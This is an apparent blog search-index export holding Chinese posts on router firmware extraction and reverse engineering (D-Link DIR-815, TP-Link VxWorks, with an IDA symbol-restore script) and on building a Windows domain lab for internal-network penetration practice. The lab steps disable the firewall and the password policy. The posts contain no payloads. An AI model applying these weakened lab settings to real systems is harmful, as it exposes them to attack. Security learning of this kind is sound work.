<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>固件解压分析工具及方法整理</title>
    <url>/post/7dc2b2.html</url>
    <content><![CDATA[<p>整理一些基本的概念和一些固件解压的方法，不能太依赖<code>binwalk</code>，如果<code>binwalk</code>解压不出来，那岂不是一点招都没有了。</p>
<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>固件不是硬件，而是软件。在嵌入式设备中，通常是被固化在只读存储器中，所以被称为固件。</p>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统是操作系统的重要组成部分，是操作运行的基础。但是不同的嵌入式设备使用的文件系统都不一样。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。</p>
<p>嵌入式设备中肯定希望文件系统越小越好，因为在路由器设备中，存储设备的大小是分厂有限的，所以这些文件系统中各种压缩格式随处可见。</p>
<p><code>Squashfs</code>是一个只读格式的文件系统。当系统启动后，会将文件系统保存在一个压缩过的文件系统中，这个文件可以使用换回的形式挂在并对其中的文件进行访问，当程序需要访问某些文件时，仅对部分的压缩文件解压缩。<code>Squashfs</code>常用的压缩格式有<code>Gzip</code>,<code>LZMA</code>,<code>LZO</code>,<code>XZ(LZMA2)</code>。嵌入式设备的根文件系统会按照<code>Squashfs</code>文件系统常用压缩格式中的一种进行打包，形成一个完整的<code>Squashfs</code>文件系统，然后与路由器操作系统的内核一起形成固件。</p>
<a id="more"></a>


<h2 id="提取常用工具"><a href="#提取常用工具" class="headerlink" title="提取常用工具"></a>提取常用工具</h2><h3 id="Linux自带工具"><a href="#Linux自带工具" class="headerlink" title="Linux自带工具"></a>Linux自带工具</h3><ul>
<li><code>file</code> 用来检测是否是有效的文件和文件类型</li>
<li><code>xxd</code> 会生成给定文件或者输入的十六进制格式</li>
<li><code>hexdump</code> 16进制查看工具</li>
<li><code>strings</code> 展示输入程序中可识别的字符串</li>
<li><code>dd</code>  用于复制文件并对原文件的内容进行转换和格式化处理 </li>
<li><code>lzma</code> 解压<code>LZMA</code>文件</li>
<li><code>grep</code>超级牛逼的文本搜索工具</li>
<li><code>unsquashfs</code> 用于解压<code>squashfs</code>的文件格式</li>
</ul>
<p>这里提供两个网站，如果看不懂命令可以直接上去查。</p>
<ul>
<li><a href="https://man.linuxde.net/" target="_blank" rel="noopener">https://man.linuxde.net/</a></li>
<li><a href="https://www.explainshell.com/" target="_blank" rel="noopener">https://www.explainshell.com/</a></li>
</ul>
<h3 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h3><ul>
<li><code>Binwalk</code></li>
<li><code>IDA</code></li>
<li><code>ghidra</code> 相比于IDA，这个更适合嵌入式分析</li>
<li><a href="https://github.com/rampageX/firmware-mod-kit" target="_blank" rel="noopener">firmware-mod-kit</a></li>
</ul>
<p>关于工具的安装就不提了，详细参考<a href="https://blog.pwntools.xyz/2019/10/18/IoT测试环境搭建/#more">IoT测试环境搭建</a></p>
<h2 id="手动解压固件"><a href="#手动解压固件" class="headerlink" title="手动解压固件"></a>手动解压固件</h2><p>这里随便找一款<code>Dlink</code>的路由器的固件来分析,型号是<code>Dlink dir-815</code>，<code>Binwalk</code>分以一下固件的熵，如果很高，作为练习就可以换一款了。</p>
<p>使用<code>file</code>查看文件:</p>
<p><img src="http://file.smilehacker.net/image-20191103194436077.png" alt="image-20191103194436077"></p>
<p><code>file</code>没有发现符合的任何文件类型的匹配，但是不代表固件就是完全没接触过的格式。因为file是从首字节开始的，他会按照内部的数据进行比对。</p>
<h3 id="手动判断文件类型"><a href="#手动判断文件类型" class="headerlink" title="手动判断文件类型"></a>手动判断文件类型</h3><p><code>file</code>没有发现符合的文件格式，我们就需要采用下面的方法分析.</p>
<ol>
<li>“strings|grep”检索文件系统的<code>magic</code>签名头</li>
<li>“hexdumo|grep” 检索<code>magic</code>签名的偏移</li>
<li>“dd|file”确认<code>magic</code>签名偏移处的文件系统。</li>
</ol>
<p>文件系统的<code>magic</code>签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统。当然，如果要确认包含的文件系统，还需要利用其他条件配合证命，(2，3做的)</p>
<h4 id="检索magic签名头"><a href="#检索magic签名头" class="headerlink" title="检索magic签名头"></a>检索<code>magic</code>签名头</h4><p>头部的特征都是根据每种文件系统开头的几百字节提炼出来的。常用的如下:</p>
<ul>
<li><code>cramfs</code>文件系统头部特征为<code>0x28cd3d45</code></li>
<li><code>squashfs</code>文件系统头部特征较多，其中一些是标准的<code>squashfs</code>头部,有些是老外研究发现的大概有<code>sqsh</code>,<code>hsqs</code>,<code>qshs</code>,<code>shsq</code>,<code>hsqt</code>,<code>tqsh</code>,<code>sqlz</code>这七种。</li>
</ul>
<p>先检查是否存在<code>cfamfs</code>文件系统头部特征。因为我们不知道文件系统时大端序还是小端序，我们需要执行两次</p>
<pre><code class="shell">strings DIR_815.bin | grep `python -c &#39;print &quot;\x28\xcd\x3d\x45&quot;&#39;`
strings DIR_815.bin | grep `python -c &#39;print &quot;\x45\x3d\xcd\x28&quot;&#39;`</code></pre>
<p><img src="http://file.smilehacker.net/image-20191103195839036.png" alt="image-20191103195839036"></p>
<p>没有发现<code>cfamfs</code>的头部特征，然后使用相同的办法，去检查是否存在<code>squashfs</code>的头部特征</p>
<p><img src="http://file.smilehacker.net/image-20191103200044122.png" alt="image-20191103200044122"></p>
<p>找到了一个，但是我们不能确定该文件是不是一个<code>squashfs</code>文件系统，还需要进一步确定。</p>
<h4 id="确定文件系统"><a href="#确定文件系统" class="headerlink" title="确定文件系统"></a>确定文件系统</h4><p>使用如下命令检测是否针对包含<code>squashfs</code>文件系统。</p>
<pre><code class="shell">hexdump -C DIR_815.bin | grep -n &#39;hsqs&#39;

# hexdump -C参数: 输出规范的十六进制和ASCII码。
# grep -n参数: 在显示符合范本样式的那一列之前，标示出该列的编号。</code></pre>
<p><img src="http://file.smilehacker.net/image-20191103200559319.png" alt="image-20191103200559319"></p>
<p>在偏移<code>0x000f008C</code>处发现了<code>hsqs</code>,我们从<code>0x000f0080C</code>这个地方复制<code>100</code>字节数据，再使用<code>file</code>命令查看。使用<code>dd</code>命令</p>
<p>为什么时100字节？因为<code>squashfs</code>文件系统的头部校验不会超过100字节</p>
<pre><code class="shell">dd if=DIR_815.bin bs=1 count=100 skip=983180 of=test

# dd 可以跨文件、设备、分区和卷复制数据
# if 标准文件输入
# of 标准文件输出
# bs 块大小
# skip 用于跳过指向固件二进制映像中特定地址的指针</code></pre>
<p><img src="http://file.smilehacker.net/image-20191103201356488.png" alt="image-20191103201356488"></p>
<p>这次就识别出来了。一定注意这里的文件大小<code>2808054</code></p>
<h3 id="手动提取固件"><a href="#手动提取固件" class="headerlink" title="手动提取固件"></a>手动提取固件</h3><p>我们知道了在固件偏移<code>983180(0x000f0080C)</code>的地方，我们继续用<code>dd</code>提取出文件文件，然后尝试手动提取。</p>
<pre><code class="shell">dd if=DIR_815.bin bs=1 skip=983180 count=2808054 of=test </code></pre>
<p>这里一定要指定<code>count</code>，直接提取到文件末尾。在这中间我们还需要检查<code>squashfs</code>使用的压缩算法。</p>
<p><img src="http://file.smilehacker.net/image-20191103233812796.png" alt="image-20191103233812796"></p>
<p>可以看到时<code>lzma</code>的格式，我们可以使用ubuntu自带的<code>unsquashfs</code>来解压，但是这个工具并不好用，我们可以使用<code>firmware-mod-kit</code>来解压。其实<code>firmware-mod-kit</code>也是调用<code>binwalk</code>来做的</p>
<pre><code class="shell">./unsquashfs_all.sh ../Desktop/dir815_FW_101/_DIR_815.bin.extracted/F008C.squashfs</code></pre>
<p><img src="http://file.smilehacker.net/image-20191105181148263.png" alt="image-20191105181148263"></p>
<p>可以在目录下看到我们解压出来的文件</p>
<p><img src="http://file.smilehacker.net/image-20191105181232646.png" alt="image-20191105181232646"></p>
<h2 id="自动解压固件"><a href="#自动解压固件" class="headerlink" title="自动解压固件"></a>自动解压固件</h2><p>自动解压固件就不多介绍了，<code>binwalk -Me</code>直接解压，在这里记录一下<code>binwalk</code>的几个用法</p>
<h3 id="扫描文件头"><a href="#扫描文件头" class="headerlink" title="扫描文件头"></a>扫描文件头</h3><pre><code class="shell">binwalk DIR_815.bin</code></pre>
<p><img src="http://file.smilehacker.net/image-20191103205700709.png" alt="image-20191103205700709"></p>
<h3 id="Binwalk递归解压固件"><a href="#Binwalk递归解压固件" class="headerlink" title="Binwalk递归解压固件"></a>Binwalk递归解压固件</h3><pre><code class="shell">binwalk -Me DIR_815.bin</code></pre>
<p>解压的明明白白</p>
<p><img src="http://file.smilehacker.net/image-20191103205819179.png" alt="image-20191103205819179"></p>
<h3 id="Binwalk识别大端序小端序"><a href="#Binwalk识别大端序小端序" class="headerlink" title="Binwalk识别大端序小端序"></a>Binwalk识别大端序小端序</h3><pre><code class="shell">binwalk -A DIR_815.bin</code></pre>
<p>不是很准确</p>
<h3 id="Binwalk-熵值分析"><a href="#Binwalk-熵值分析" class="headerlink" title="Binwalk 熵值分析"></a>Binwalk 熵值分析</h3><pre><code class="shell">binwalk -E DIR_815.bin

# python2需要安装sudo apt-get install python-matplotlib
# python3需要安装sudo apt-get install python3-matplotlib</code></pre>
<p>根据熵值可以判断该固件是否加密。</p>
<p><img src="http://file.smilehacker.net/image-20191105174637703.png" alt="image-20191105174637703"></p>
<p>  简单地说，一个系统越是有序，信息熵就越低；反之，一个系统越是混乱，信息熵就越高。 </p>
<p><code>Binwalk</code>没什么好说的，看看官方文档就好了。</p>
<h2 id="Vxworks固件解压及IDA修复过程-ghidra"><a href="#Vxworks固件解压及IDA修复过程-ghidra" class="headerlink" title="Vxworks固件解压及IDA修复过程(ghidra)"></a>Vxworks固件解压及IDA修复过程(ghidra)</h2><p>搞一个<code>TPLINK</code>的路由器，之前没搞过，跟普通的文件系统不太一样。但是网上的文章并不是很多，而且没有一个总结的非常清楚。这里记录一下，也不是非常清楚。</p>
<p>TPlink基于<code>Vxworks</code>的路由器没有像<code>Linux</code>版本的根文件系统，整个系统就是一个大的bin文件，只要把bootloader加载到合适的位置就直接运行了。</p>
<h3 id="使用Binwalk初步分析固件"><a href="#使用Binwalk初步分析固件" class="headerlink" title="使用Binwalk初步分析固件"></a>使用<code>Binwalk</code>初步分析固件</h3><p>先使用<code>binwalk</code>对文件进行扫描，看有没有什么敏感信息</p>
<p><img src="http://file.smilehacker.net/image-20191105182511902.png" alt="image-20191105182511902"></p>
<p>除了开头的<strong>uImage header</strong>之外其余全都是<code>LZMA</code>压缩之后的数据，但是注意红框内的数据，<code>Binwalk</code>显示出来的大小，一个为<code>-1</code>，另一个为<code>3580296</code>，这两个都不太寻常，我们先看大小为<code>3M</code>的这份数据，他比其他的<code>lzma</code>压缩之后的数据要大的多，其中有可能包含一些数据。我们直接用<code>binwalk</code>解压，尽量不要给自己找事(用<code>dd</code>解压)</p>
<pre><code class="shell">binwalk -e firmware.bin

# dd解压的方法
dd if=firmware.bin of=10400.lzma skip=66560 bs=1 count=1241152 # 1307712-66560

# lzma 解压
lzma -d 10400.lzma</code></pre>
<p>发现解压不出来。</p>
<p><img src="http://file.smilehacker.net/image-20191106153809813.png" alt="image-20191106153809813"></p>
<p>我们用winhex打开固件看看<code>0x13F440</code>处的到底是什么数据。</p>
<p><img src="http://file.smilehacker.net/image-20191106153957693.png" alt="image-20191106153957693"></p>
<p>这里看上去明显不像是数据的结尾。我们往上翻一翻。</p>
<p><img src="http://file.smilehacker.net/image-20191106164741622.png" alt="image-20191106164741622"></p>
<p><code>13E6F4</code>好像更像时数据的结尾，我们将数据复制出来，并用<code>lzma</code>解压</p>
<pre><code class="shell">dd if=WDR_7660_V1.0_2.0.16_190325.bin of=10400.lzma skip=66560 bs=1 count=1237748

lzma -d 10400.lzma</code></pre>
<p><img src="http://file.smilehacker.net/image-20191106165240644.png" alt="image-20191106165240644"></p>
<p>这个跟<code>binwalk -e</code>解压出来的结果一摸一样。这里记录以下一个解压的过程。</p>
<h3 id="使用IDA分析10400"><a href="#使用IDA分析10400" class="headerlink" title="使用IDA分析10400"></a>使用IDA分析10400</h3><p> 由于IDA Pro无法识别该文件，提示为”Binary file”，因此需要确定CPU的架构及加载基址。在”uImage header”部分已经有一些信息，如下，可以看到CPU架构为<code>arm</code>。 </p>
<p><img src="http://file.smilehacker.net/image-20191106165829158.png" alt="image-20191106165829158"></p>
<p> 在<code>uImage header</code>中有一个<code>Entry Point</code>地址<code>0x41C00000</code>，这个地址可能是<code>uBoo</code>t程序的加载基址，而不是<code>10400</code>文件的加载基址。采用该地址作为加载基址，虽然也能识别出<code>2000</code>多个函数，但在后续导入符号表时会对不上。 </p>
<p>使用<code>Binwalk</code>识别程序是大端序还是小端序</p>
<p><img src="http://file.smilehacker.net/image-20191106170029255.png" alt="image-20191106170029255"></p>
<p>现在我们还是差一个入口地址，这个地址要怎么找到？</p>
<h3 id="固件加载地址分析"><a href="#固件加载地址分析" class="headerlink" title="固件加载地址分析"></a>固件加载地址分析</h3><p>这里目前的文章并没有说清楚这个地址是怎么来的，给人更多的感觉像猜出来的。。但是能解决问题就行。我们使用<code>Winhex</code>加载固件后，来到地址<code>0x10400</code>，然后将数据往前翻，在不远处你会发现这个地址。两处地址同时指向<code>0x40205000</code>。</p>
<p><img src="http://file.smilehacker.net/image-20191105182421398.png" alt="image-20191105182421398"></p>
<p>这里还有一些其他的方法，参见：</p>
<ul>
<li><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a>  </li>
<li><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></li>
<li><a href="https://www.jianshu.com/p/12d8f509169c" target="_blank" rel="noopener">https://www.jianshu.com/p/12d8f509169c</a>  </li>
</ul>
<blockquote>
<p>第一个跟第二个PDF将的差不多，都是同一个人写的，里面介绍了好几种方法,但是都不太适合我，因为10400导入IDA之后是大段乱码的，并没有识别出<code>UsrInit</code>函数，关于定位BSS清理函数在后期可以试一下</p>
<p>第三篇文章将的其实也在PDF中有提到过，主要时利用内嵌符号表来分析加载地址。但是很不巧，我这里是一个外部的符号表，并不能直接拿来计算。</p>
</blockquote>
<p>IDA加载过程如下</p>
<p>选择对应的架构平台，并设置加载地址</p>
<p><img src="http://file.smilehacker.net/image-20191106173136394.png" alt="image-20191106173136394"></p>
<p><img src="http://file.smilehacker.net/image-20191106173315351.png" alt="image-20191106173315351"></p>
<p>加载成功后你会发现识别出来的函数很少,<code>Import</code>和<code>export</code>都是空的，而且。。没有符号表</p>
<p><img src="http://file.smilehacker.net/image-20191106173426913.png" alt="image-20191106173426913"></p>
<p>接下来我们就要城市修复符号表了</p>
<h3 id="修复符号表"><a href="#修复符号表" class="headerlink" title="修复符号表"></a>修复符号表</h3><p> 使用<code>binwalk</code>直接提取该固件，在提取后的目录中搜索包含<code>VxWorks</code>中的某个关键函数如<code>bzero</code>的文件，如下 </p>
<pre><code class="shell">grep -r bzero</code></pre>
<p><img src="http://file.smilehacker.net/image-20191106173810837.png" alt="image-20191106173810837"></p>
<p>发现<code>140B96</code>中发现了这个字符串，我们用strings查看下他内部的字符串</p>
<p><img src="http://file.smilehacker.net/image-20191106175319206.png" alt="image-20191106175319206"></p>
<p>可以看到有非常多的函数名，那他就是符号表无疑了。使用<code>hexdump</code>查看其内容,并计算字符串</p>
<p><img src="http://file.smilehacker.net/image-20191106174558913.png" alt="image-20191106174558913"></p>
<p>除了标记出来的，剩下的都是数据了，我们来计算一下符号名表的偏移。</p>
<blockquote>
<p>8(自身长度) + 8 (每组数据的长度) * 31ba(总共这么多个字符串)=18DD8</p>
</blockquote>
<p>之后使用hexdump查看下<code>18DD8</code>处的数据</p>
<p><img src="http://file.smilehacker.net/image-20191106175050303.png" alt="image-20191106175050303"></p>
<p>可以看到计算无误，正好是符号名表的开始。加下来使用如下IDA脚本批量导入符号表。</p>
<pre><code class="python">import idautils
import idc
import idaapi

symfile_path = &#39;./140B96&#39;    # 符号文件
symbols_table_start = 8
strings_table_start = 0x18DD8 # 字符串表偏移的地址

with open(symfile_path, &#39;rb&#39;) as f:
    symfile_contents = f.read()

symbols_table = symfile_contents[symbols_table_start:strings_table_start]
strings_table = symfile_contents[strings_table_start:]

def get_string_by_offset(offset):
    index = 0
    while True:
        if strings_table[offset+index] != &#39;\x00&#39;:
            index += 1
        else:
            break
    return strings_table[offset:offset+index]


def get_symbols_metadata():
    symbols = []
    for offset in xrange(0, len(symbols_table),8):
        symbol_item = symbols_table[offset:offset+8]
        flag = symbol_item[0]
        string_offset = int(symbol_item[1:4].encode(&#39;hex&#39;), 16)
        string_name = get_string_by_offset(string_offset)
        target_address = int(symbol_item[-4:].encode(&#39;hex&#39;), 16)
        symbols.append((flag, string_name, target_address))
    return symbols


def add_symbols(symbols_meta_data):
    for flag, string_name, target_address in symbols_meta_data:
        idc.MakeName(target_address, string_name)
        if flag == &#39;\x54&#39;:
            idc.MakeCode(target_address)
            idc.MakeFunction(target_address)


if __name__ == &quot;__main__&quot;:
    symbols_metadata = get_symbols_metadata()
    add_symbols(symbols_metadata)</code></pre>
<p>使用IDA运行此脚本，结果如下。</p>
<p><img src="http://file.smilehacker.net/image-20191106175803536.png" alt="image-20191106175803536"></p>
<p>识别出来了大部分函数以及近8000个函数</p>
<h3 id="Ghidra-加载符号表"><a href="#Ghidra-加载符号表" class="headerlink" title="Ghidra 加载符号表"></a>Ghidra 加载符号表</h3><p>银河实验室开发了一个<code>vxhunter</code>，专门用于<code>vxworks</code>，但是测试了一下实际效果并不好。</p>
<ul>
<li>下载地址: <a href="https://github.com/PAGalaxyLab/vxhunter" target="_blank" rel="noopener">vxhunter</a></li>
</ul>
<p>只能字节写脚本了。这里不太方便放出。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="http://zeroyu.xyz/2019/08/15/How_to_start_IoT_Reverse/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/08/15/How_to_start_IoT_Reverse/</a>   </p>
</li>
<li><p>&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;</p>
</li>
<li><p><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</a> </p>
</li>
<li><p><a href="https://www.freebuf.com/sectool/75915.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/75915.html</a> </p>
</li>
<li><p><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a> </p>
</li>
<li><p><a href="http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-路由器分析-固件初步分析/" target="_blank" rel="noopener">http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%86%e6%9e%90-%e5%9b%ba%e4%bb%b6%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90/</a> </p>
</li>
<li><p><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>固件</tag>
        <tag>分析</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透 - 环境搭建</title>
    <url>/post/704fc7a0.html</url>
    <content><![CDATA[<h2 id="内网渗透-环境搭建"><a href="#内网渗透-环境搭建" class="headerlink" title="内网渗透 - 环境搭建"></a>内网渗透 - 环境搭建</h2><p>因为自身的原因，必须从对内网渗透进行一次总结。这次写文章来记录一下整个复习的过程</p>
<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍:"></a>环境介绍:</h2><p>最初的环境就两台机器，一台<code>Windows server 2008 R2</code> 和一台<code>Windows 7</code>，<code>08 Server</code>作为域控。</p>
<p>在后面的渗透环境中，添加了机器会给相应拓扑图的讲解.</p>
<a id="more"></a>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>在我们开始配置域环境前，我们需要先给每台机器配置一个静态IP。如果不配置，在测试过程中服务器IP改变了将会是一个很尴尬的事情。已<code>Windows 2008 Server</code> 为例演示如何配置静态<code>IP</code>.</p>
<p>我们在在虚拟机的网络配置处为测试网络配置一个IP段。以后用来测试的机器全部使用这个网卡就方便管理了。在虚拟机界面上选择 编辑-&gt;虚拟网络配置器,来到如下界面:</p>
<p><img src="http://file.smilehacker.net/image-20191114150326707.png" alt="image-20191114150326707"></p>
<p>点击更改配置,选择添加网络，直接选择确定即可:</p>
<p><img src="http://file.smilehacker.net/image-20191114150419292.png" alt="image-20191114150419292"></p>
<p>稍微等待一下，来到如下几面：</p>
<p><img src="http://file.smilehacker.net/image-20191114150547375.png" alt="image-20191114150547375"></p>
<p>选择仅主机模式(这个模式是无法上网的，如果想要上网可以选择NAT模式)，我们可以修改子网的IP段。我这里就不改了，就用默认的。完成后点击应用。等待一会，完成后关闭页面即可.</p>
<p><img src="http://file.smilehacker.net/image-20191114150825809.png" alt="image-20191114150825809"></p>
<p>我们右键虚拟机选项卡，设置网卡为我们刚刚配置的<code>Vmware2</code>，然后点击确定。</p>
<p><img src="http://file.smilehacker.net/image-20191114151336368.png" alt="image-20191114151336368"></p>
<p>之后选择网络-&gt;打开网络和共享中心</p>
<p><img src="http://file.smilehacker.net/image-20191114151458107.png" alt="image-20191114151458107"></p>
<p>选择更改适配器设置,</p>
<p><img src="http://file.smilehacker.net/image-20191114151704217.png" alt="image-20191114151704217"></p>
<p>右键选择属性.</p>
<p><img src="http://file.smilehacker.net/image-20191114151624938.png" alt="image-20191114151624938"></p>
<p>进行如下配置，注意设置DNS服务器为自身IP：</p>
<p><img src="http://file.smilehacker.net/image-20191114152004703.png" alt="image-20191114152004703"></p>
<p>一路确定点下来，然后就可以开始进入搭建域服务器的过程。</p>
<h2 id="域控服务器搭建"><a href="#域控服务器搭建" class="headerlink" title="域控服务器搭建"></a>域控服务器搭建</h2><h3 id="配置DNS服务器"><a href="#配置DNS服务器" class="headerlink" title="配置DNS服务器"></a>配置DNS服务器</h3><p>这一步不是必须的，在安装Active Directory 域服务时可以同时装上DNS服务器。</p>
<p>Active Directory 域服务安装向导–&gt;其它域控制服务器，勾上DNS服务器也有同样效果，我们按照最简单的来，所以勾上这一项。</p>
<p>打开服务器管理 选择角色-&gt;添加角色</p>
<p><img src="http://file.smilehacker.net/image-20191114145516595.png" alt="image-20191114145516595"></p>
<p>在弹出的页面直接点击下一步，来到如下页面，勾选<code>DNS服务器</code>.并点击下一步。</p>
<p><img src="http://file.smilehacker.net/image-20191114152358096.png" alt="image-20191114152358096"></p>
<p>一路下一步，然后点击安装:</p>
<p><img src="http://file.smilehacker.net/image-20191114152431894.png" alt="image-20191114152431894"></p>
<p><img src="http://file.smilehacker.net/image-20191114152442053.png" alt="image-20191114152442053"></p>
<p>安装完成,之后重启服务器:</p>
<p><img src="http://file.smilehacker.net/image-20191114152517112.png" alt="image-20191114152517112"></p>
<h3 id="配置-Active-Directory-域服务"><a href="#配置-Active-Directory-域服务" class="headerlink" title="配置 Active Directory 域服务"></a>配置 <strong>Active Directory 域服务</strong></h3><p>开始-&gt;运行-&gt;输入命令:dcpromo</p>
<p><img src="http://file.smilehacker.net/image-20191114153313193.png" alt="image-20191114153313193"></p>
<p>弹出域服务安装向导,点击下一步。</p>
<p><img src="http://file.smilehacker.net/image-20191114153449021.png" alt="image-20191114153449021"></p>
<p>一直点击下一步，来到如下页面:</p>
<p><img src="http://file.smilehacker.net/image-20191114153556548.png" alt="image-20191114153556548"></p>
<p>我们选择“在新林中新建域”。在如下页面输入我们的域名，因为是测试，所以随便写就可以了.</p>
<p><img src="http://file.smilehacker.net/image-20191114153754047.png" alt="image-20191114153754047"></p>
<p>点击下一步:</p>
<p><img src="http://file.smilehacker.net/image-20191114153811259.png" alt="image-20191114153811259"></p>
<p>林功能级别选择<code>Windows Server 2008 R2</code> 并点击“下一步”按钮</p>
<p><img src="http://file.smilehacker.net/image-20191114154004587.png" alt="image-20191114154004587"></p>
<p><img src="http://file.smilehacker.net/image-20191114154019286.png" alt="image-20191114154019286"></p>
<p>弹出如下页面，再点击下一步即可。</p>
<p><img src="http://file.smilehacker.net/image-20191114154049538.png" alt="image-20191114154049538"></p>
<p>弹出DNS提示框，点击“是“按钮，继续安装</p>
<p><img src="http://file.smilehacker.net/image-20191114154135110.png" alt="image-20191114154135110"></p>
<p>这里不坐任何更改，直接点击下一步;</p>
<p><img src="http://file.smilehacker.net/image-20191114154211883.png" alt="image-20191114154211883"></p>
<p>然后配置还原密码(这个不是域管理员的密码)</p>
<p><img src="http://file.smilehacker.net/image-20191114154417470.png" alt="image-20191114154417470"></p>
<p>等待即可:</p>
<p><img src="http://file.smilehacker.net/image-20191114154433281.png" alt="image-20191114154433281"></p>
<h2 id="加入域环境"><a href="#加入域环境" class="headerlink" title="加入域环境"></a>加入域环境</h2><p>现在使用<code>win 7</code>来加入当前域，在开始配置前，我们给<code>win7</code>主机分配一个域账号。</p>
<p><img src="http://file.smilehacker.net/image-20191114163551945.png" alt="image-20191114163551945"></p>
<p>填写信息即可:</p>
<p><img src="http://file.smilehacker.net/image-20191114163635703.png" alt="image-20191114163635703"></p>
<p>我们可以配置密码为用不过期的（出现问题的看文末怎么解决）:</p>
<p><img src="http://file.smilehacker.net/image-20191114163851971.png" alt="image-20191114163851971"></p>
<p>成功添加用户。</p>
<p><img src="http://file.smilehacker.net/image-20191114170700726.png" alt="image-20191114170700726"></p>
<p>接下来可以让<code>win7</code>加入域环境了。我们回到<code>win7</code>，配置静态<code>ip</code>如下，要注意<code>DNS</code>的配置，<code>Dns</code>配置的时我们刚刚搭建的<code>DNS</code>服务器，也就是域控的<code>IP</code></p>
<p><img src="http://file.smilehacker.net/image-20191114171058950.png" alt="image-20191114171058950"></p>
<p>然后我们选择计算机，右键属性:</p>
<p><img src="http://file.smilehacker.net/image-20191114171259378.png" alt="image-20191114171259378"></p>
<p>然后进行如下操作：</p>
<p><img src="http://file.smilehacker.net/image-20191114171358404.png" alt="image-20191114171358404"></p>
<p>进行相关设置后，点击确定，会让我们输入用户名和密码，我们填入刚刚添加的用户名密码即可。</p>
<p><img src="http://file.smilehacker.net/image-20191114171515631.png" alt="image-20191114171515631"></p>
<p><img src="http://file.smilehacker.net/image-20191114171615809.png" alt="image-20191114171615809"></p>
<p>点击确定后提示欢迎加入域。</p>
<p><img src="http://file.smilehacker.net/image-20191114171654656.png" alt="image-20191114171654656"></p>
<p>这样就是最简单的环境配置了，后面想要往域中添加其他机器，操作都是类似的，就不做多的讲解了.</p>
<h2 id="一些其他问题"><a href="#一些其他问题" class="headerlink" title="一些其他问题:"></a>一些其他问题:</h2><h4 id="当我们输入net-view-domian回显如下"><a href="#当我们输入net-view-domian回显如下" class="headerlink" title="当我们输入net view /domian回显如下:"></a>当我们输入<code>net view /domian</code>回显如下:</h4><p>发生错误6118</p>
<p><img src="http://file.smilehacker.net/image-20191114162852506.png" alt="image-20191114162852506"></p>
<p>解决方法：</p>
<ol>
<li>关闭防火墙</li>
<li>启动 <code>computer browser</code>服务<ol>
<li>win+r 输入<code>Services.msc</code></li>
<li>在服务窗口，找到并双击computer browser服务 </li>
<li>在computer browser服务对话框，将启动类型设置成“自动”，如果服务状态处于停止状态，点击“启动”按钮启动服务后，点击确定退出啊设置窗口即可。 </li>
</ol>
</li>
</ol>
<p><img src="http://file.smilehacker.net/image-20191114163136190.png" alt="image-20191114163136190"></p>
<p>问题解决:</p>
<p><img src="http://file.smilehacker.net/image-20191114163304741.png" alt="image-20191114163304741"></p>
<h4 id="密码复杂性策略"><a href="#密码复杂性策略" class="headerlink" title="密码复杂性策略"></a>密码复杂性策略</h4><p>设置密码为123456时会提示。</p>
<p><img src="http://file.smilehacker.net/image-20191114164402084.png" alt="image-20191114164402084"></p>
<p>我们配置的密码都必须非常的复杂，我们自己都记不住，所以关掉它。</p>
<p><strong>这里的配置跟印象中的配置有一点不一样</strong></p>
<p>开始-&gt;管理工具-&gt;组策略管理</p>
<p><img src="http://file.smilehacker.net/image-20191114165948277.png" alt="image-20191114165948277"></p>
<p>找到如下选项，选择编辑</p>
<p><img src="http://file.smilehacker.net/image-20191114170039988.png" alt="image-20191114170039988"></p>
<p>然后找到如下设置,关闭之后我们就搞定了:</p>
<p><img src="http://file.smilehacker.net/image-20191114170216644.png" alt="image-20191114170216644"></p>
<p><img src="http://file.smilehacker.net/image-20191114170247404.png" alt="image-20191114170247404"></p>
<p>之后子啊命令行中更新策略:</p>
<blockquote>
<p> gpupdate /force </p>
</blockquote>
<p><img src="http://file.smilehacker.net/image-20191114170630127.png" alt="image-20191114170630127"></p>
<p>问题解决:</p>
<p><img src="http://file.smilehacker.net/image-20191114170651582.png" alt="image-20191114170651582"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透</tag>
        <tag>内网</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL Fuzzing study notes</title>
    <url>/post/35374.html</url>
